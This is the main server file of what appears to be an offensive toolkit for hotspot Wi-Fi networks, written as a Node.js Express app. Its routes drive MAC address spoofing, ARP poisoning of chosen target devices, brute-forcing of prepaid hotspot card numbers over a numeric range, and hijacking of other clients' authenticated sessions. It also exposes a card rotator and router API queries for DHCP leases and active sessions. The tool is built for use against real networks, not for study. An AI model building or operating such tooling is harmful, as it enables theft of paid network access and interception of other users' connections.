const express = require('express');
const path = require('path');
const { execFile } = require('child_process');
const logger = require('./utils/logger');
const wifiManager = require('./core/wifi-manager');
const hotspotAuth = require('./core/hotspot-auth');

if (process.platform === 'win32') {
  execFile('powershell', ['-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', path.join(__dirname, '..', 'scripts', 'disable-quickedit.ps1')], { timeout: 5000 }, () => {});
}
const proxyServer = require('./core/proxy-server');
const quotaMonitor = require('./core/quota-monitor');
const cardRotator = require('./core/card-rotator');
const sessionStore = require('./core/session-store');
const networkScanner = require('./core/network-scanner');
const deepScanner = require('./core/deep-scanner');
const arpSpoofer = require('./core/arp-spoofer');
const cardBruteForce = require('./core/card-bruteforce');
const sessionHijack = require('./core/session-hijack');
const scanHistoryStore = require('./core/scan-history');
const config = require('../config/default.json');

const app = express();
const PORT = config.server.port || 3003;
const HOST = config.server.host || '0.0.0.0';
const PROXY_PORT = config.proxy.port || 8080;

app.use(express.json());
app.use(express.static(path.join(__dirname, '..', 'public')));

app.use((req, res, next) => {
  logger.debug(`${req.method} ${req.path}`);
  next();
});

function apiResponse(res, result) {
  res.status(result.statusCode || 200).json(result);
}

app.get('/api/status', (req, res) => {
  apiResponse(res, {
    isSuccess: true,
    value: {
      cardRotator: cardRotator.getState(),
      proxy: { running: proxyServer.isRunning(), bytes: proxyServer.getBytesTransferred() },
      session: hotspotAuth.getActiveSession(),
      cards: sessionStore.getStats(),
    },
    error: null,
    statusCode: 200,
  });
});

app.get('/api/wifi', async (req, res) => {
  try {
    const info = await wifiManager.getAdapterInfo();
    apiResponse(res, { isSuccess: true, value: info, error: null, statusCode: 200 });
  } catch (err) {
    apiResponse(res, { isSuccess: false, value: null, error: err.message, statusCode: 500 });
  }
});

app.post('/api/wifi/spoof', async (req, res) => {
  try {
    const mac = req.body.mac || null;
    const result = await wifiManager.spoofMac(mac);
    apiResponse(res, { isSuccess: true, value: result, error: null, statusCode: 200 });
  } catch (err) {
    apiResponse(res, { isSuccess: false, value: null, error: err.message, statusCode: 500 });
  }
});

app.post('/api/wifi/reset', async (req, res) => {
  try {
    const result = await wifiManager.resetMac();
    apiResponse(res, { isSuccess: true, value: result, error: null, statusCode: 200 });
  } catch (err) {
    apiResponse(res, { isSuccess: false, value: null, error: err.message, statusCode: 500 });
  }
});

app.get('/api/hotspot/login', async (req, res) => {
  const { username, domain } = req.query;
  if (!username) {
    apiResponse(res, { isSuccess: false, value: null, error: 'username required', statusCode: 400 });
    return;
  }
  const result = await hotspotAuth.login(username, domain);
  apiResponse(res, result);
});

app.get('/api/hotspot/logout', async (req, res) => {
  const result = await hotspotAuth.logout();
  apiResponse(res, result);
});

app.get('/api/hotspot/status', async (req, res) => {
  const result = await hotspotAuth.getRemainingQuota();
  apiResponse(res, result);
});

app.get('/api/hotspot/config', (req, res) => {
  apiResponse(res, {
    isSuccess: true,
    value: hotspotAuth.getConfig(),
    error: null,
    statusCode: 200,
  });
});

app.put('/api/hotspot/config', (req, res) => {
  const updates = req.body;
  if (!updates || Object.keys(updates).length === 0) {
    apiResponse(res, { isSuccess: false, value: null, error: 'No updates provided', statusCode: 400 });
    return;
  }
  hotspotAuth.updateConfig(updates);
  apiResponse(res, {
    isSuccess: true,
    value: hotspotAuth.getConfig(),
    error: null,
    statusCode: 200,
  });
});

app.post('/api/hotspot/test-login', async (req, res) => {
  const { card, domain, ...testConfig } = req.body;
  if (!card) {
    apiResponse(res, { isSuccess: false, value: null, error: 'card number required', statusCode: 400 });
    return;
  }
  const result = await hotspotAuth.testLogin(card, domain, Object.keys(testConfig).length ? testConfig : null);
  apiResponse(res, result);
});

app.get('/api/cards', (req, res) => {
  const cards = sessionStore.getCards();
  const stats = sessionStore.getStats();
  apiResponse(res, { isSuccess: true, value: { cards, stats }, error: null, statusCode: 200 });
});

app.post('/api/cards', (req, res) => {
  const { number, domain, profile, password } = req.body;
  if (!number) {
    apiResponse(res, { isSuccess: false, value: null, error: 'Card number required', statusCode: 400 });
    return;
  }
  const result = sessionStore.addCard({ number, domain, profile, password });
  apiResponse(res, result);
});

app.put('/api/cards/:index', (req, res) => {
  const index = parseInt(req.params.index, 10);
  const result = sessionStore.updateCard(index, req.body);
  apiResponse(res, result);
});

app.delete('/api/cards/:index', (req, res) => {
  const index = parseInt(req.params.index, 10);
  const result = sessionStore.removeCard(index);
  apiResponse(res, result);
});

app.get('/api/rotation/start', async (req, res) => {
  const result = await cardRotator.start();
  apiResponse(res, result);
});

app.get('/api/rotation/stop', (req, res) => {
  const result = cardRotator.stop();
  apiResponse(res, result);
});

app.get('/api/rotation/state', (req, res) => {
  apiResponse(res, {
    isSuccess: true,
    value: cardRotator.getState(),
    error: null,
    statusCode: 200,
  });
});

app.get('/api/history', (req, res) => {
  const limit = parseInt(req.query.limit, 10) || 50;
  apiResponse(res, {
    isSuccess: true,
    value: sessionStore.getHistory(limit),
    error: null,
    statusCode: 200,
  });
});

app.get('/api/scan-history', (req, res) => {
  const limit = parseInt(req.query.limit, 10) || 20;
  apiResponse(res, {
    isSuccess: true,
    value: {
      scans: scanHistoryStore.getScans(limit),
      knownDevices: scanHistoryStore.getKnownDevices(),
      totalKnown: scanHistoryStore.getKnownDevicesCount(),
    },
    error: null,
    statusCode: 200,
  });
});

app.get('/api/scan-history/grouped', (req, res) => {
  const { sortBy, sortDir } = req.query;
  apiResponse(res, {
    isSuccess: true,
    value: scanHistoryStore.getGroupedByNetwork(sortBy, sortDir),
    error: null,
    statusCode: 200,
  });
});

app.post('/api/mac-devices/hijack', (req, res) => {
  const { mac } = req.body;
  if (!mac) return apiResponse(res, { isSuccess: false, value: null, error: 'MAC required', statusCode: 400 });
  apiResponse(res, { isSuccess: true, value: scanHistoryStore.recordHijackForMac(mac), error: null, statusCode: 200 });
});

app.post('/api/mac-devices/favorite', (req, res) => {
  const { mac } = req.body;
  if (!mac) return apiResponse(res, { isSuccess: false, value: null, error: 'MAC required', statusCode: 400 });
  apiResponse(res, { isSuccess: true, value: scanHistoryStore.toggleFavorite(mac), error: null, statusCode: 200 });
});

app.get('/api/scan-history/devices', (req, res) => {
  apiResponse(res, {
    isSuccess: true,
    value: scanHistoryStore.getKnownDevices(),
    error: null,
    statusCode: 200,
  });
});

app.get('/api/scan-history/:id', (req, res) => {
  const id = parseInt(req.params.id, 10);
  const detail = scanHistoryStore.getScanDetail(id);
  if (!detail) {
    apiResponse(res, { isSuccess: false, value: null, error: 'Scan not found', statusCode: 404 });
    return;
  }
  apiResponse(res, { isSuccess: true, value: detail, error: null, statusCode: 200 });
});

app.delete('/api/scan-history', (req, res) => {
  scanHistoryStore.clear();
  apiResponse(res, { isSuccess: true, value: { cleared: true }, error: null, statusCode: 200 });
});

app.get('/api/network/scan', async (req, res) => {
  try {
    const subnet = req.query.subnet || null;
    const timeout = parseInt(req.query.timeout, 10) || 150;
    const result = await networkScanner.scan(subnet, timeout);
    apiResponse(res, result);
  } catch (err) {
    apiResponse(res, { isSuccess: false, value: null, error: err.message, statusCode: 500 });
  }
});

app.get('/api/network/gateway', async (req, res) => {
  try {
    const result = await networkScanner.scanGateway();
    apiResponse(res, result);
  } catch (err) {
    apiResponse(res, { isSuccess: false, value: null, error: err.message, statusCode: 500 });
  }
});

app.get('/api/network/scan-deep', async (req, res) => {
  try {
    const subnet = req.query.subnet || null;
    const timeout = parseInt(req.query.timeout, 10) || 150;
    const subnetStart = parseInt(req.query.subnetStart, 10);
    const subnetEnd = parseInt(req.query.subnetEnd, 10);
    const result = await deepScanner.scan(subnet, timeout, isNaN(subnetStart) ? -1 : subnetStart, isNaN(subnetEnd) ? -1 : subnetEnd);
    apiResponse(res, result);
  } catch (err) {
    apiResponse(res, { isSuccess: false, value: null, error: err.message, statusCode: 500 });
  }
});

app.get('/api/network/enhanced-scan', async (req, res) => {
  try {
    const subnet = req.query.subnet || null;
    const timeout = parseInt(req.query.timeout, 10) || 150;
    const result = await networkScanner.enhancedScan(subnet, timeout);
    scanHistoryStore.recordScan(result);
    apiResponse(res, result);
  } catch (err) {
    apiResponse(res, { isSuccess: false, value: null, error: err.message, statusCode: 500 });
  }
});

app.get('/api/network/scan-fallback', async (req, res) => {
  try {
    const subnet = req.query.subnet || null;
    const timeout = parseInt(req.query.timeout, 10) || 150;
    const result = await networkScanner.scanFallback(subnet, timeout);
    apiResponse(res, result);
  } catch (err) {
    apiResponse(res, { isSuccess: false, value: null, error: err.message, statusCode: 500 });
  }
});

app.get('/api/network/deep-enhanced', async (req, res) => {
  try {
    const subnet = req.query.subnet || null;
    const timeout = parseInt(req.query.timeout, 10) || 150;
    const subnetStart = parseInt(req.query.subnetStart, 10);
    const subnetEnd = parseInt(req.query.subnetEnd, 10);
    const result = await deepScanner.enhancedScan(subnet, timeout, isNaN(subnetStart) ? -1 : subnetStart, isNaN(subnetEnd) ? -1 : subnetEnd);
    scanHistoryStore.recordScan(result);
    apiResponse(res, result);
  } catch (err) {
    apiResponse(res, { isSuccess: false, value: null, error: err.message, statusCode: 500 });
  }
});

app.get('/api/network/arp-only', async (req, res) => {
  try {
    const result = await deepScanner.arpOnly();
    scanHistoryStore.recordScan(result);
    apiResponse(res, result);
  } catch (err) {
    apiResponse(res, { isSuccess: false, value: null, error: err.message, statusCode: 500 });
  }
});

app.post('/api/network/router-api/configure', async (req, res) => {
  const { host, username, password } = req.body;
  if (!host) {
    apiResponse(res, { isSuccess: false, value: null, error: 'Router host IP required', statusCode: 400 });
    return;
  }
  const result = await networkScanner.configureRouterApi(host, username, password);
  apiResponse(res, result);
});

app.get('/api/network/router-api/test', async (req, res) => {
  try {
    const api = networkScanner.getMikrotikApi();
    if (!api.enabled) {
      apiResponse(res, { isSuccess: false, value: null, error: 'Router API not configured', statusCode: 400 });
      return;
    }
    const leases = await api.getDhcpLeases();
    const arp = await api.getArpTable();
    const hotspot = await api.getActiveHotspotSessions();
    apiResponse(res, {
      isSuccess: true,
      value: { leases, arp, hotspot, leaseCount: leases.length, arpCount: arp.length, hotspotCount: hotspot.length },
      error: null,
      statusCode: 200,
    });
  } catch (err) {
    apiResponse(res, { isSuccess: false, value: null, error: err.message, statusCode: 500 });
  }
});

app.get('/api/network/hotspot-check', async (req, res) => {
  const result = await deepScanner.checkHotspot();
  apiResponse(res, result);
});

app.get('/api/arp/table', async (req, res) => {
  const result = await arpSpoofer.getArpTable();
  apiResponse(res, result);
});

app.post('/api/arp/poison', async (req, res) => {
  const { targetIp, targetMac, durationSeconds } = req.body;
  if (!targetIp || !targetMac) {
    apiResponse(res, { isSuccess: false, value: null, error: 'targetIp and targetMac required', statusCode: 400 });
    return;
  }
  const result = await arpSpoofer.poisonTarget(targetIp, targetMac, durationSeconds || 30);
  apiResponse(res, result);
});

app.get('/api/arp/stop', (req, res) => {
  const result = arpSpoofer.stopPoison();
  apiResponse(res, result);
});

app.get('/api/arp/status', (req, res) => {
  apiResponse(res, {
    isSuccess: true, value: arpSpoofer.getStatus(), error: null, statusCode: 200,
  });
});

app.get('/api/bruteforce/start', (req, res) => {
  const prefix = req.query.prefix || '262277';
  const rangeStart = parseInt(req.query.start, 10) || 0;
  const rangeEnd = parseInt(req.query.end, 10) || 9999;
  const result = cardBruteForce.start({ prefix, rangeStart, rangeEnd });
  apiResponse(res, result);
});

app.get('/api/bruteforce/pause', (req, res) => {
  apiResponse(res, cardBruteForce.pause());
});

app.get('/api/bruteforce/resume', (req, res) => {
  apiResponse(res, cardBruteForce.resume());
});

app.get('/api/bruteforce/stop', (req, res) => {
  apiResponse(res, cardBruteForce.stop());
});

app.get('/api/bruteforce/state', (req, res) => {
  apiResponse(res, {
    isSuccess: true, value: cardBruteForce.getState(), error: null, statusCode: 200,
  });
});

app.post('/api/hijack', async (req, res) => {
  const { targetIp, targetMac, mode, strategy } = req.body;
  if (!targetIp || !targetMac) {
    apiResponse(res, { isSuccess: false, value: null, error: 'targetIp and targetMac required', statusCode: 400 });
    return;
  }
  const apiMac = (targetMac || '').toUpperCase().replace(/-/g, ':');
  const blockedMac = (config.hijack?.blockedGatewayMac || 'DC:2C:6E:31:06:A2').toUpperCase();
  if (apiMac === blockedMac) {
    apiResponse(res, { isSuccess: false, value: null, error: 'لا يمكن اختراق البوابة (MAC الراوتر) — اختر جهاز عميل', statusCode: 400 });
    return;
  }
  try {
    const hijackOptions = { strategy: strategy || 'smart-auto' };
    const result = mode === 'full'
      ? await sessionHijack.fullHijack(targetIp, targetMac, hijackOptions)
      : await sessionHijack.quickHijack(targetIp, targetMac, hijackOptions);
    apiResponse(res, result);
  } catch (err) {
    logger.error('Hijack route crashed', err.message);
    apiResponse(res, { isSuccess: false, value: null, error: err.message, statusCode: 500 });
  }
});

app.post('/api/hijack/check', async (req, res) => {
  const { targetIp, targetMac } = req.body;
  if (!targetIp || !targetMac) {
    apiResponse(res, { isSuccess: false, value: null, error: 'targetIp and targetMac required', statusCode: 400 });
    return;
  }
  const result = await sessionHijack.checkTarget(targetIp, targetMac);
  apiResponse(res, result);
});

app.post('/api/hijack/analyze', async (req, res) => {
  const { targetIp, targetMac } = req.body;
  if (!targetIp) {
    apiResponse(res, { isSuccess: false, value: null, error: 'targetIp required', statusCode: 400 });
    return;
  }
  try {
    let gatewayIp = null;
    try {
      const { execFileSync } = require('child_process');
      const ipOut = execFileSync('powershell.exe', [
        '-NoProfile', '-Command',
        '$r=Get-NetRoute -DestinationPrefix "0.0.0.0/0"|Where-Object NextHop -ne "0.0.0.0"|Select-Object -First 1; if($r){$r.NextHop}else{$null}'
      ], { timeout: 3000, encoding: 'utf-8' });
      gatewayIp = (ipOut || '').trim();
    } catch {}
    const result = await sessionHijack.analyzeTarget(targetIp, targetMac, gatewayIp);
    apiResponse(res, { isSuccess: true, value: result, error: null, statusCode: 200 });
  } catch (err) {
    apiResponse(res, { isSuccess: false, value: null, error: err.message, statusCode: 500 });
  }
});

app.get('/api/hijack/verify', async (req, res) => {
  const result = await sessionHijack.verifyCurrentSession();
  apiResponse(res, result);
});

app.get('/api/hijack/state', (req, res) => {
  apiResponse(res, {
    isSuccess: true, value: sessionHijack.getState(), error: null, statusCode: 200,
  });
});

app.get('/api/hijack/strategies', (req, res) => {
  apiResponse(res, {
    isSuccess: true, value: sessionHijack.getStrategies(), error: null, statusCode: 200,
  });
});

function sseWrite(res, data) {
  try {
    const payload = `data: ${JSON.stringify(data)}\n\n`;
    res.write(payload);
  } catch (err) {
    logger.warn('SSE write failed (client disconnected)', err.message);
  }
}

app.get('/api/hijack/progress', (req, res) => {
  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Access-Control-Allow-Origin': '*',
  });

  const current = sessionHijack.getCurrentProgress();
  if (current) {
    sseWrite(res, { type: 'progress', data: current });
  }

  const onStep = (event) => {
    sseWrite(res, { type: 'step', data: event });
  };
  const onLog = (event) => {
    sseWrite(res, { type: 'log', data: event });
  };
  const onProgress = (progress) => {
    sseWrite(res, { type: 'progress', data: progress });
  };

  const emitter = sessionHijack.getProgressEmitter();
  emitter.on('hijack-step', onStep);
  emitter.on('hijack-log', onLog);
  emitter.on('hijack-progress', onProgress);

  const keepAlive = setInterval(() => {
    try { res.write(`:keepalive\n\n`); } catch {}
  }, 10000);

  req.on('close', () => {
    clearInterval(keepAlive);
    emitter.off('hijack-step', onStep);
    emitter.off('hijack-log', onLog);
    emitter.off('hijack-progress', onProgress);
  });
});

app.get('/api/wifi/quick-check', async (req, res) => {
  try {
    const result = await wifiManager.quickCheck();
    apiResponse(res, { isSuccess: true, value: result, error: null, statusCode: 200 });
  } catch (err) {
    apiResponse(res, { isSuccess: false, value: null, error: err.message, statusCode: 500 });
  }
});

app.put('/api/hotspot/config/save', (req, res) => {
  const saved = hotspotAuth.saveConfigToDisk();
  apiResponse(res, {
    isSuccess: saved,
    value: saved ? hotspotAuth.getConfig() : null,
    error: saved ? null : 'Failed to save config to disk',
    statusCode: saved ? 200 : 500,
  });
});

app.get('/api/settings', (req, res) => {
  apiResponse(res, {
    isSuccess: true,
    value: config,
    error: null,
    statusCode: 200,
  });
});

async function start() {
  try {
    await proxyServer.start(PROXY_PORT, '127.0.0.1');
  } catch (err) {
    logger.warn('Proxy server could not start (non-blocking)', err.message);
  }

  app.listen(PORT, HOST, () => {
    logger.info(`Server running at http://${HOST}:${PORT}`);
    logger.info(`Dashboard: http://localhost:${PORT}`);
    logger.info(`Proxy: http://127.0.0.1:${PROXY_PORT}`);
  });
}

start().catch(err => {
  logger.error('Failed to start server', err.message);
  process.exit(1);
});
